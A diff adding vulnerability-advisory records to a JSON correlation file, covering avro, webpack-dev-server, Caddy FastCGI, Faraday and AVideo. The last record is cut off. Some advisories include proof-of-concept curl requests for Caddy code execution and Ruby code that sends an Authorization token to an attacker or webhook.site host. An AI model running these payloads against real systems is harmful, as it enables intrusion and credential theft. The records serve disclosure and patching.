@@ -1,5 +1,669 @@
 {
-  "candidate_count": 0,
-  "candidates": [],
-  "correlated_at": "2026-05-18T15:58:17.781147+00:00"
+  "candidate_count": 23,
+  "candidates": [
+    {
+      "canonical_id": "CVE-2023-37475",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-1284",
+        "CWE-190",
+        "CWE-191",
+        "CWE-400",
+        "CWE-681",
+        "CWE-770",
+        "CWE-789"
+      ],
+      "description": "# Integer Overflow in Avro Decoder\n\n## Summary\n\nSeveral Avro decoder paths read attacker-controlled 64-bit values from the wire format and either narrowed them to platform-sized `int` before bounds-checking, or summed them with overflow-prone signed-`int` arithmetic. On 32-bit targets (`GOARCH=386`, `arm`, `mips`, `wasm`, etc.), the truncation paths can silently bypass byte-slice limits, select the wrong union branch, or hit the OCF negative-`make` panic via wrap. Three sub-issues are not 32-bit-specific: cumulative-size arithmetic overflow in `arrayDecoder.Decode` / `mapDecoder.Decode` / `mapDecoderUnmarshaler.Decode` (wraps at `math.MaxInt64` on amd64 / arm64 and bypasses `MaxSliceAllocSize` / `MaxMapAllocSize`), `math.MinInt` negation in block-header handling, and `make([]byte, size)` with a negative size in OCF block reads \u2014 all three panic or bypass caps on any platform, giving an attacker a denial-of-service primitive there.\n\nExploitation requires only an untrusted Avro stream. No primitives reach beyond denial-of-service on current code paths; see the union-index discussion below for a caveat.\n\n\n## Description\n\nSix call sites in the decoder accepted `int64` values from the Avro wire format and converted to `int` before validation. On a 32-bit build any wire value with magnitude `\u2265 2\u00b3\u00b9` truncates and the post-conversion value bears no useful relationship to the original. A value of `(1<<32) + 5` narrows to `5`; `1<<32` narrows to `0`; values just past `MaxInt32` narrow to large negatives.\n\nThis is distinct from the existing `Config.MaxSliceAllocSize`, `Config.MaxByteSliceSize`, and the new `Config.MaxMapAllocSize` limits, because narrowing happens *before* the limit comparison \u2014 the limit sees the truncated value, not the original wire value, so the cap is bypassed.\n\nThree further sub-issues are not 32-bit-specific:\n\n- `arrayDecoder.Decode`, `mapDecoder.Decode`, and `mapDecoderUnmarshaler.Decode` summed attacker-controlled block lengths via `size += int(l)` and then checked `size > limit`. On amd64 / arm64 the running total wraps at `math.MaxInt64`; the post-wrap negative value passes the `> limit` check, and the decoder proceeds. Regression test: `TestDecoder_ArrayMultiBlockExceedsMaxInt` uses `math.MaxInt \u2212 2` for the second block's count and a `MaxSliceAllocSize` of 13 to demonstrate this on amd64. The Avro block-count field is a signed `long` on the wire, so block counts up to `math.MaxInt64` are admissible \u2014 there is no implicit 2\u00b3\u00b9 ceiling.\n- `ReadBlockHeader()` returns the absolute value of negative block lengths; the negation is unsafe for `math.MinInt`, which on every platform panics on overflow.\n- `ocf/ocf.go readBlock()` passes the decoded block size directly to `make([]byte, size)`. A negative wire value panics on every platform; on 32-bit, values `> MaxInt32` additionally panic via the narrowing path.\n\n## Affected components\n\n| File | Function(s) | Bug class | Platforms |\n|------|-------------|-----------|-----------|\n| `reader.go` | `ReadBlockHeader` \u2014 narrowing | Narrowing | 32-bit |\n| `reader.go` | `ReadBlockHeader` \u2014 `-math.MinInt` | Signed overflow (CWE-191) | all |\n| `reader.go` | `readBytes` (via `Reader.ReadBytes`, `Reader.ReadString`) | Narrowing | 32-bit |\n| `reader_skip.go` | `SkipString`, `SkipBytes` (and OCF skip path) | Narrowing | 32-bit |\n| `codec_array.go` | `arrayDecoder.Decode` | Cumulative-size arithmetic overflow (CWE-190) | all |\n| `codec_map.go` | `mapDecoder.Decode`, `mapDecoderUnmarshaler.Decode` | Cumulative-size arithmetic overflow (CWE-190) | all |\n| `ocf/ocf.go` | `skipToEnd`, `readBlock` \u2014 narrowing | Narrowing | 32-bit |\n| `ocf/ocf.go` | `readBlock` \u2014 negative `make([]byte, \u2026)` | Unchecked-negative (CWE-1284) | all |\n| `reader_generic.go` | union-type index decoding in `Reader.ReadNext` | Narrowing, possible wrong-branch selection | 32-bit |\n\nPR #9 (commit [`bed99b3`](https://github.com/iskorotkov/avro/commit/bed99b315ec097a1a5eb7ae074ef57a91848c583)) covered `ReadBlockHeader`, the cumulative checks in array/map codecs, and the skip helpers. The completeness pass (commit [`e1a570f`](https://github.com/iskorotkov/avro/commit/e1a570f9a8a4fe4b1bc2b4b1fb6d24e4a5f04358)) covered the union index, `readBytes`, and OCF `readBlock`, and added a 32-bit CI job.\n\nNote: the typed-codec union decoder in `codec_union.go` (`getUnionSchema` \u2192 `Reader.ReadInt`) is **not** affected by the union-index narrowing \u2014 `ReadInt` returns `int32`, no narrowing occurs. The narrowing is specific to `Reader.ReadNext` in the generic decode path (reached via `Unmarshal` into `any` / `map[string]any`).\n\n## Technical details\n\n1. **Block-header narrowing and `MinInt` negation.** `ReadBlockHeader()` returned wire-format `int64` values through narrower operations; on 32-bit, large positives truncated. Negating `math.MinInt` to convert a negative block-count signal into a positive size is undefined-on-overflow, and on every platform `-MinInt` panics on overflow when used in subsequent arithmetic. The fix reads into a `*64`-suffixed local, range-checks against `MinInt32`/`MaxInt32` (or `MinInt`/`MaxInt` as appropriate), and narrows after validation.\n\n2. **Cumulative array and map size overflow (all platforms).** `arrayDecoder.Decode`, `mapDecoder.Decode`, and `mapDecoderUnmarshaler.Decode` summed attacker-controlled block lengths using overflow-prone addition; cumulative size could wrap before reaching the configured limit. On amd64 with `MaxSliceAllocSize = 13`, block 1 of 3 elements, block 2 of `math.MaxInt \u2212 2` elements: the pre-fix `size += int(l)` wraps to `math.MinInt`, then `MinInt > 13` is false, so the check passes and the decoder proceeds. The fix uses subtraction-safe comparisons (`l > limit - size` rather than `size + l > limit`), which is overflow-immune.\n\n3. **Skip-length truncation.** `SkipString`, `SkipBytes`, and the OCF skip helper now route through `SkipNBytesInt64()`, which keeps the length as `int64` and range-checks before any narrowing.\n\n4. **Byte-slice length truncation.** A wire-format length such as `(1<<32) + 5` truncated to `5` in `readBytes()`, slipping past `Config.MaxByteSliceSize` on 32-bit. The fix reads the length as `int64`, compares against `MaxByteSliceSize` before narrowing, and returns \"value is too big\" if exceeded.\n\n5. **Union index narrowing (generic decode path only).** `Reader.ReadNext` decoded the union index as `int64` and immediately cast to `int`. On 32-bit, `1<<32` narrowed to `0` and silently selected `types[0]` despite the explicit upper-bound check immediately above. If `types[0]` is the null branch (idiomatic for `[\"null\", T]` nullable unions), the practical result is a null value where the producer encoded a non-null payload \u2014 a DoS-grade logic error. If `types[0]` is a non-trivial schema, downstream bytes are parsed against the wrong schema and produce well-typed but semantically wrong values; treat this as the worst-case interpretation when assessing impact on your own deployment. The typed-codec union decoder (`codec_union.go` `getUnionSchema` \u2192 `Reader.ReadInt`) is not affected.\n\n6. **OCF block-size narrowing and negative `make`.** `readBlock()` passes the decoded `int64` size directly to `make([]byte, size)`. A negative wire value panics on every platform; a value `> MaxInt32` additionally panics via the 32-bit narrowing path. The fix validates the size is in `[0, MaxByteSliceSize]` before narrowing.\n\n## Fixed behavior\n\nBoth commits apply the same pattern across every site:\n\n1. Read the wire value into an `int64`-typed local.\n2. Range-check upper and lower bounds before narrowing.\n3. Compare cumulative limits using subtraction-safe arithmetic.\n4. Route skip operations through `SkipNBytesInt64()`.\n5. Return descriptive errors using the consistent `\"value is too big\"` / `\"value is too small\"` wording.\n6. Cast to `int` only after validation succeeds.\n\nCI: a `test-386` job runs the suite under `GOARCH=386` with `CGO_ENABLED=0` (`-race` is amd64/arm64-only). Three tests with untyped `2147483648` constants whose `t.Skipf` gates fire too late (the file fails to compile before any test runs) were split into sibling `*_64bit_test.go` files gated by `//go:build amd64 || arm64 || ...`.\n\n## Affected versions\n\n- `github.com/hamba/avro/v2` \u2014 all versions up to and including `v2.31.0` (repository is read-only upstream).\n- `github.com/iskorotkov/avro/v2` \u2014 all versions prior to `v2.33.0`.\n\n## Fixed versions\n\n`github.com/iskorotkov/avro/v2` `v2.33.0` and later. There is no upstream fix for `github.com/hamba/avro/v2` \u2014 module path is archived. Migrate to the fork as described under Mitigation.\n\n## Mitigation\n\nMigrate from `github.com/hamba/avro/v2` to `github.com/iskorotkov/avro/v2 >= v2.33.0`. The packages share the same API surface; replace the import path and run `go mod tidy`:\n\n```diff\n- import \"github.com/hamba/avro/v2\"\n+ import \"github.com/iskorotkov/avro/v2\"\n```\n\nFor consumers that prefer the original import path, a `replace` directive in `go.mod` is supported:\n\n```\nreplace github.com/hamba/avro/v2 => github.com/iskorotkov/avro/v2 v2.33.0\n```\n\n`replace` is honoured only for the **main** module of a build \u2014 transitive consumers must add their own `replace`, or migrate the import path directly.\n\nNo further configuration is required to benefit from the integer-narrowing fixes \u2014 the validation runs on the existing decode path.\n\nIf you cannot upgrade immediately:\n\n- Do not decode untrusted Avro data on any platform \u2014 the cumulative-arithmetic overflow paths (`arrayDecoder.Decode`, `mapDecoder.Decode`, `mapDecoderUnmarshaler.Decode`) are reachable on amd64 / arm64. The truncation paths on 32-bit cannot be mitigated by setting `Config.MaxByteSliceSize` lower, because the truncated post-narrowing value is what the limit sees, not the original wire value.\n- For the cross-platform `math.MinInt` and OCF negative-size panic paths, wrapping `Decode` / OCF read calls in a goroutine with `defer recover()` contains the crash, but is not a substitute for upgrading. The other narrowing paths return errors rather than panicking, so `recover()` does nothing for them.\n- Isolate decoding workers so a crash is bounded.\n\n## Proof-of-concept inputs\n\n- A `bytes` or `string` length of `(1<<32) + N` for small `N`, which narrows to `N` on 32-bit and bypasses `Config.MaxByteSliceSize`.\n- A union index of `1<<32`, which narrows to `0` on 32-bit and selects `types[0]` despite the upper-bound check.\n- An array or map encoded across multiple blocks whose cumulative element count wraps the signed `int` running total before the limit check fires. Demonstrated on amd64 by `TestDecoder_ArrayMultiBlockExceedsMaxInt`: `MaxSliceAllocSize = 13`, block 1 of `3`, block 2 of `math.MaxInt \u2212 2`. Wraps to `math.MinInt`, check passes, decoder proceeds.\n- A block header whose absolute value is `math.MinInt`, triggering the unsafe negation (cross-platform).\n- An OCF block size that is negative on the wire, causing `make([]byte, size)` to panic (cross-platform); or a positive value `> MaxInt32` on 32-bit, same outcome via narrowing.\n\n## References\n\n- Initial hardening PR: [iskorotkov/avro#9](https://github.com/iskorotkov/avro/pull/9)\n- Completeness pass PR: [iskorotkov/avro#10](https://github.com/iskorotkov/avro/pull/10)\n- Fix commits: [`bed99b3`](https://github.com/iskorotkov/avro/commit/bed99b315ec097a1a5eb7ae074ef57a91848c583), [`e1a570f`](https://github.com/iskorotkov/avro/commit/e1a570f9a8a4fe4b1bc2b4b1fb6d24e4a5f04358)\n- Release: [`v2.33.0`](https://github.com/iskorotkov/avro/releases/tag/v2.33.0)\n- Security policy: [`SECURITY.md`](https://github.com/iskorotkov/avro/blob/main/SECURITY.md)\n- Related advisories on this fork: [`GHSA-w8j3-pq8g-8m7w`](https://github.com/iskorotkov/avro/security/advisories/GHSA-w8j3-pq8g-8m7w) (CPU exhaustion \u2014 overlaps via the same large-block-count payload shape), [`GHSA-mx64-mj3q-7prj`](https://github.com/iskorotkov/avro/security/advisories/GHSA-mx64-mj3q-7prj) (unbounded map allocation)\n- Cross-module precedent on `hamba/avro`: [`GO-2023-1930`](https://pkg.go.dev/vuln/GO-2023-1930) / `CVE-2023-37475` / `GHSA-9x44-9pgq-cf45`\n- Upstream (read-only): [`hamba/avro`](https://github.com/hamba/avro)\n\n## Credits\n\n- **Discovery and initial fixes** (PR #9, commit `bed99b3` \u2014 `ReadBlockHeader`, cumulative array/map checks, skip helpers): Daniel B\u0142a\u017cewicz ([@klajok](https://github.com/klajok))\n- **Completeness fixes** (commit `e1a570f` \u2014 union index, `readBytes`, OCF `readBlock`, 32-bit CI coverage): Ivan Korotkov ([@iskorotkov](https://github.com/iskorotkov))\n\n## Timeline\n\n- **2026-05-04** \u2014 Initial integer-overflow hardening (PR #9, `bed99b3`) merged.\n- **2026-05-04** \u2014 Completeness pass (`e1a570f`) merged; 32-bit CI job added.\n- **2026-05-06** \u2014 `v2.33.0` tagged and released.\n- **2026-05-11** \u2014 Advisory published.\n- **2026-05-15** \u2014 Advisory revised.",
+      "first_seen": "2026-05-18T16:31:44.440413+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441763+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 2,
+      "references": [
+        "https://github.com/advisories/GHSA-mc57-h6j3-3hmv",
+        "https://github.com/advisories/GHSA-mx64-mj3q-7prj",
+        "https://github.com/iskorotkov/avro/security/advisories/GHSA-mc57-h6j3-3hmv",
+        "https://github.com/iskorotkov/avro/security/advisories/GHSA-mx64-mj3q-7prj"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "iskorotkov/avro: Integer Overflow in Decoder"
+    },
+    {
+      "canonical_id": "CVE-2025-30359",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-749"
+      ],
+      "description": "### Impact\n\nWhen webpack-dev-server is running on a non-HTTPS origin (the default), cross-origin requests from malicious websites can load the dev server's JavaScript bundles via `<script>` tags. The fix introduced in v5.2.1 (CVE-2025-30359) relied on `Sec-Fetch-Mode` and `Sec-Fetch-Site` request headers to block these requests, but browsers only send these headers for [potentially trustworthy origins](https://w3c.github.io/webappsec-secure-contexts/#is-origin-trustworthy). Over plain HTTP, the headers are absent and the check is bypassed.\n\nAn attacker who knows the dev server's host, port, and output path can exfiltrate all module source code by intercepting the webpack runtime's module registration.\n\nThis does not affect Chrome 142+ (and other Chromium-based browsers) due to [local network access restrictions](https://developer.chrome.com/release-notes/142#local_network_access_restrictions).\n\n### Patches\n\nPatched in webpack-dev-server >= 5.2.4 by setting `Cross-Origin-Resource-Policy: same-origin` on responses.\n\n### Workarounds\n\nRun the dev server with HTTPS enabled (`--https` or `server.type: 'https'` in config).\n\n### Resources\n\n- [GHSA-4v9v-hfq4-rm2v](https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v) (CVE-2025-30359) - original vulnerability\n- [GHSA-9jgg-88mc-972h](https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h) (CVE-2025-30360) - prior bypass",
+      "first_seen": "2026-05-18T16:31:44.441469+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441469+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://cna.openjsf.org/security-advisories.html",
+        "https://github.com/advisories/GHSA-79cf-xcqc-c78w",
+        "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v",
+        "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-79cf-xcqc-c78w",
+        "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-6402"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "webpack-dev-server vulnerable to cross-origin source code exposure on non-HTTPS origins"
+    },
+    {
+      "canonical_id": "CVE-2026-24895",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-176",
+        "CWE-178",
+        "CWE-20"
+      ],
+      "description": "### Summary\n\nThe FastCGI transport's `splitPos()` in [`modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go`](https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go) misuses `golang.org/x/text/search` with `search.IgnoreCase` when the request path contains a non-ASCII byte. Two distinct flaws in that fallback let an attacker mislead Caddy's FastCGI splitting into treating a non-`.php` (or other configured `split_path` extension) file as a script. In any deployment where the attacker can place content into a file served via FastCGI (uploads, file storage, etc.), this can be escalated to remote code execution by crafting a URL whose path triggers either flaw.\n\nThis function was adapted from FrankenPHP's code (see [the source comment](https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go#L429)) and inherits the same bugs. Both were originally reported against FrankenPHP by @KC1zs4 as [GHSA-3g8v-8r37-cgjm](https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm) (which absorbed the duplicate GHSA-v4h7-cj44-8fc8). Credit for finding the underlying flaws belongs to @KC1zs4.\n\n### Details\n\n```go\nvar splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)\n\nfunc (t Transport) splitPos(path string) int {\n\tif len(t.SplitPath) == 0 {\n\t\treturn 0\n\t}\n\tpathLen := len(path)\n\tfor _, split := range t.SplitPath {\n\t\tsplitLen := len(split)\n\t\tfor i := range pathLen {\n\t\t\tif path[i] >= utf8.RuneSelf {\n\t\t\t\tif _, end := splitSearchNonASCII.IndexString(path, split); end > -1 {\n\t\t\t\t\treturn end\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif i+splitLen > pathLen {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tmatch := true\n\t\t\tfor j := range splitLen {\n\t\t\t\tc := path[i+j]\n\t\t\t\tif c >= utf8.RuneSelf {\n\t\t\t\t\tif _, end := splitSearchNonASCII.IndexString(path, split); end > -1 {\n\t\t\t\t\t\treturn end\n\t\t\t\t\t}\n\t\t\t\t\tbreak // <-- flaw 1: 'match' is still true\n\t\t\t\t}\n\t\t\t\tif 'A' <= c && c <= 'Z' {\n\t\t\t\t\tc += 'a' - 'A'\n\t\t\t\t}\n\t\t\t\tif c != split[j] {\n\t\t\t\t\tmatch = false\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\tif match {\n\t\t\t\treturn i + splitLen\n\t\t\t}\n\t\t}\n\t}\n\treturn -1\n}\n```\n\n#### Flaw 1 \u2014 Control-flow: stale `match` after inner non-ASCII fallback\n\nIn the inner `for j` loop, when a byte satisfies `c >= utf8.RuneSelf` and `splitSearchNonASCII.IndexString(...)` returns `-1`, the loop `break`s without setting `match = false`. The outer code then evaluates `if match { return i + splitLen }` with `match` still `true`, returning a position as if the configured extension had been matched. The script-name suffix actually present at that offset is whatever bytes the attacker chose, so a file named `name.<U+00A1>.txt` gets routed as PHP.\n\n#### Flaw 2 \u2014 Unicode equivalence: `search.IgnoreCase` folds non-ASCII lookalikes onto ASCII\n\n`search.New(language.Und, search.IgnoreCase)` performs Unicode equivalence matching (compatibility decomposition + case folding), which goes far beyond the ASCII-only case folding the surrounding code is built for. Many code points fold onto ASCII `.`, `p`, `h`, `p`, so a path containing `\ufe52php`, `\uff0ephp`, `.\uff50hp`, `.\u24df\u24d7\u24df`, `.\ud835\uddfd\ud835\uddf5\ud835\uddfd`, `.\ud835\udcc5\ud835\udcbd\ud835\udcc5`, `.\ud835\udd95\ud835\udd8d\ud835\udd95`, etc. is reported as `.php`.\n\nBoth flaws share the same root cause: invoking `search.IgnoreCase` to match an ASCII-only, validated-lower-case `SplitPath` entry against an arbitrary path. `Provision()` already guarantees every entry is ASCII and lower-cased, so any byte `>= utf8.RuneSelf` in the path can never be part of a legitimate match \u2014 but the fallback ignored that guarantee.\n\n### PoC\n\nRun against a Caddy build serving FastCGI to PHP-FPM (or any FastCGI app where script lookup is gated by `split_path`). Caddyfile:\n\n```text\n:8080 {\n    root * /app/public\n    php_fastcgi unix//run/php/php-fpm.sock\n}\n```\n\nPlace attacker-controlled files in `/app/public`:\n\n- `/app/public/poc-match-unset.\\xc2\\xa1.` \u2014 `<?php echo \"marker=flaw1\\n\";`\n- `/app/public/poc-search-norm.\ud835\uddfd\ud835\uddf5\ud835\uddfd` \u2014 `<?php echo \"marker=flaw2\\n\";`\n\nTrigger:\n\n```bash\n# baseline (correctly NOT routed to PHP)\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-match-unset.txt/trigger\"\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-search-norm/trigger\"\n\n# flaw 1 \u2014 the .\u00a1.txt file ends up as SCRIPT_FILENAME\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-match-unset.%C2%A1.txt/trigger\"\n\n# flaw 2 \u2014 the .\ud835\uddfd\ud835\uddf5\ud835\uddfd file ends up as SCRIPT_FILENAME\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-search-norm.%F0%9D%97%BD%F0%9D%97%B5%F0%9D%97%BD.anything-after-payload.php/trigger\"\n```\n\nBoth crafted requests respond with the marker payload from the non-`.php` file, confirming arbitrary code execution through the body of attacker-controlled files.\n\nA standalone reproducer of `splitPos()` in isolation (no Caddy build needed) is included in [GHSA-3g8v-8r37-cgjm](https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm); the function in this module is the same logic, so the same payloads apply.\n\n### Impact\n\nComparable to the previous FastCGI `split_path` issue ([GHSA-g966-83w7-6w38 / CVE-2026-24895](https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38)) but with a stricter precondition: the attacker needs the ability to place content into a file whose name matches one of the bypass patterns (the Unicode lookalike forms or a name containing a non-ASCII byte after a `.`). Where that precondition holds \u2014 common in upload endpoints, user-content stores, package mirrors \u2014 the bypass yields RCE in the FastCGI upstream via a single crafted URL, without authentication, over the network.\n\nCVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H \u2014 High (8.1).\n\n### Patch\n\nDrop the `golang.org/x/text/search` fallback entirely and treat any byte `>= utf8.RuneSelf` in the path as a non-match. `SplitPath` entries are validated ASCII-only and lower-cased upstream, so this preserves correct behavior for every legitimate path while making the Unicode bypasses unrepresentable. The replacement is a tight byte loop with no library calls in the hot path. See `fix/fastcgi-splitpos-unicode-bypass` (commit `4ddad83c`) for the implementation and regression tests.\n\n### Credit\n\nBoth flaws were originally found and reported by @KC1zs4 against FrankenPHP, where the offending `splitPos()` function was first introduced before being adapted into this module. The Caddy maintainers thank @KC1zs4 for the high-quality reports.",
+      "first_seen": "2026-05-18T16:31:44.441463+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441463+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-m675-2p33-xv9g",
+        "https://github.com/caddyserver/caddy/security/advisories/GHSA-m675-2p33-xv9g",
+        "https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm",
+        "https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Caddy: Unsafe Unicode Handling in FastCGI splitPos Allows Execution of Non-PHP Files"
+    },
+    {
+      "canonical_id": "CVE-2026-25765",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-918"
+      ],
+      "description": "## Summary\n\n`Faraday::Connection#build_exclusive_url` still allows protocol-relative host override when the request target is provided as a `URI` object instead of a `String`. This bypasses the February 2026 fix for `GHSA-33mh-2634-fwr2` and can redirect a request built from a fixed-base `Faraday::Connection` to an attacker-controlled host while preserving connection-scoped headers such as `Authorization`.\n\n## Affected Component\n\n- **Repository File(s)/Endpoint(s)**:\n  - `lib/faraday/connection.rb`\n  - `lib/faraday/request.rb`\n  - `spec/faraday/connection_spec.rb`\n  - `spec/faraday/request_spec.rb`\n- **Function(s)**:\n  - `Faraday::Connection#build_exclusive_url`\n  - `Faraday::Connection#run_request`\n  - `Faraday::Request#url`\n  - `Faraday::Request#to_env`\n- **Version(s) Tested**:\n  - `Faraday 2.14.1`\n  - repository HEAD `a01039c948d3e9e41e03d152aed7244f0fb4d5ca`\n\n## Attacker Profile\n\n- **Who**: A remote user who can influence a per-request target/path in an application that uses a fixed-base Faraday connection\n- **Access Required**: Ability to supply data that the application converts to `URI.parse(...)` and passes to `conn.get(...)`, `[conn.post](http://conn.post/)(...)`, or `req.url(...)`\n- **Capability**: Control over a protocol-relative URI such as `URI(\"//evil.example/pwn\")`\n\n## Steps to Reproduce\n\n1. Use the current repository checkout and load Faraday from `lib/`.\n2. Build a fixed-base connection and provide a protocol-relative `URI` object to `req.url`.\n3. Observe that the request is actually sent to the attacker-controlled host instead of the configured base host.\n4. Observe that the connection-scoped `Authorization` header remains attached to the off-host request.\n\n### Verification Evidence\n\n- **Environment**: macOS, Ruby from local environment, Faraday `2.14.1`, `faraday-net_http`, local WEBrick listener on `127.0.0.1:4567`, HEAD `a01039c948d3e9e41e03d152aed7244f0fb4d5ca`\n- **Commands executed**:\n\n```bash\n$ ruby -e 'require \"webrick\"; server = WEBrick::HTTPServer.new(Port: 4567, BindAddress: \"127.0.0.1\", AccessLog: [], Logger: WEBrick::Log.new($stderr, WEBrick::Log::WARN)); server.mount_proc(\"/\") { |req, res| res.status = 200; res.body = \"host=#{req.host}\\nauth=#{req[\"Authorization\"]}\\npath=#{req.path}\\n\" }; trap(\"INT\") { server.shutdown }; server.start'\n$ ruby -Ilib -e 'require \"faraday\"; require \"faraday/net_http\"; conn = Faraday.new(url: \"http://trusted.example/base\", headers: {\"Authorization\" => \"Bearer secret-token\"}) { |f| f.adapter :net_http }; target = [\"//127.0.0.1:4567\", \"/pwn\"].join; resp = conn.get(URI(target)); puts resp.status; puts resp.body'\n```\n- **PoC code** (inline):\n\n```ruby\nrequire \"faraday\"\nrequire \"faraday/net_http\"\n\nconn = Faraday.new(url: \"http://trusted.example/base\", headers: {\n  \"Authorization\" => \"Bearer secret-token\"\n}) { |f| f.adapter :net_http }\n\ntarget = [\"//127.0.0.1:4567\", \"/pwn\"].join\nresp = conn.get(URI(target))\n\nputs resp.status\nputs resp.body\n```\n- **Exit code**: `0`\n- **stdout** (relevant excerpt):\n\n```text\n200\nhost=127.0.0.1\nauth=Bearer secret-token\npath=/pwn\n```\n- **stderr** (relevant excerpt):\n\n```text\nN/A\n```\n- **Artifacts**: none\n\n### Additional External Confirmation\n\nThe issue was also independently reproduced against a public HTTP collector on Faraday `2.14.1` using the default `net_http` adapter:\n\n```ruby\nrequire \"faraday\"\nrequire \"faraday/net_http\"\n\nconn = Faraday.new(\n  url: \"http://trusted.example/base\",\n  headers: { \"Authorization\" => \"Bearer secret-token\" }\n) { |f| f.adapter :net_http }\n\ntarget = [\"//webhook.site\", \"/<collector-id>\"].join\nresp = conn.get(URI(target))\nresp.status\n# => 200\nresp.url.host\n# => \"webhook.site\"\n```\n\nThis external confirmation shows the request is not only misbuilt in memory, but is actually dispatched off-host by a real adapter under normal usage.\n\n## Supporting Materials\n\n- Existing advisory for the original string-based issue: `GHSA-33mh-2634-fwr2`\n- Existing CVE for the original string-based issue: `CVE-2026-25765`\n- Existing regression tests for the string-only fix:\n  - `spec/faraday/connection_spec.rb:314-345`\n- Existing test proving supported `URI` request input:\n  - `spec/faraday/request_spec.rb:26-31`\n\n## Impact\n\nThe direct consequence is off-host request forgery from code paths that believe they are constrained to a fixed base URL. If the\nconnection carries default headers or query parameters, those values are forwarded to the attacker-selected host.",
+      "first_seen": "2026-05-18T16:31:44.440860+00:00",
+      "frameworks": [
+        "rubygems"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.440860+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-33mh-2634-fwr2",
+        "https://github.com/advisories/GHSA-5rv5-xj5j-3484",
+        "https://github.com/lostisland/faraday/security/advisories/GHSA-5rv5-xj5j-3484"
+      ],
+      "severity": "low",
+      "source_count": 1,
+      "title": "Faraday has a possible incomplete fix for GHSA-33mh-2634-fwr2: protocol-relative URI objects still bypass host scoping"
+    },
+    {
+      "canonical_id": "CVE-2026-43881",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-204",
+        "CWE-285"
+      ],
+      "description": "CVE-2026-43881 fix `d9cdc7024` patched `users.json.php` only. The same anti-pattern survives at master HEAD in:\n\n```\nobjects/mention.json.php:17     $ignoreAdmin = true;\nobjects/mention.json.php:18     $users = User::getAllUsers($ignoreAdmin,\n                                    ['name', 'email', 'user', 'channelName'], 'a');\n```\n\nNo `User::loginCheck()`, no admin gate. Only entry guard: `preg_match('/^@/', $_REQUEST['term'])` and hard-coded `rowCount=10`.",
+      "first_seen": "2026-05-18T16:31:44.441481+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-18T16:31:44.441481+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/WWBN/AVideo/security/advisories/GHSA-vpfx-pxqw-2w79",
+        "https://github.com/advisories/GHSA-6rvw-7p8v-mjfq",
+        "https://github.com/advisories/GHSA-vpfx-pxqw-2w79"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "AVideo CVE-2026-43881 incomplete fix - `objects/mention.json.php:17` is an unauthenticated user enumeration sibling that survives `d9cdc7024`"
+    },
+    {
+      "canonical_id": "CVE-2026-45138",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
